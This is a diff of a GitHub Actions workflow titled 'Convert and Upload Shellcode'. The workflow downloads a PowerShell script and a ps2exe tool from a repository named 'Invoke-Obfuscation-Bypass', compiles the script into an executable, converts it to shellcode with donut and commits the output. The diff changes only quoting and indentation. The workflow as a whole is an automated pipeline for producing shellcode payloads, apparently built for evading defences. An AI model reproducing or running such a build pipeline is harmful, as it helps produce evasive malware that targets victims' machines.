@@ -1,4 +1,4 @@
-name: Convert and Upload Shellcode
+      name: Convert and Upload Shellcode
 
 on:
   push:
@@ -26,11 +26,11 @@ jobs:
       
 
     - name: Download the latest download.ps1
-      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -OutFile .\output\download.ps1
+      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -OutFile ".\output\download.ps1"
       shell: powershell
 
     - name: Download ps2exe.ps1
-      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/AdminTest0/Invoke-Obfuscation-Bypass/main/ps2exe.ps1 -OutFile .\output\ps2exe.ps1
+      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/AdminTest0/Invoke-Obfuscation-Bypass/main/ps2exe.ps1 -OutFile ".\output\ps2exe.ps1"
       shell: powershell
 
       
@@ -48,7 +48,7 @@ jobs:
       shell: powershell
 
     - name: Convert EXE to Shellcode
-      run: .\output\donut_v1.0\donut.exe -i download.exe -o shellcode.bin
+      run: .\output\donut_v1.0\donut.exe -i ".\output\download.exe" -o ".\output\shellcode.bin"
       shell: powershell
 
     - name: Commit and Push changes
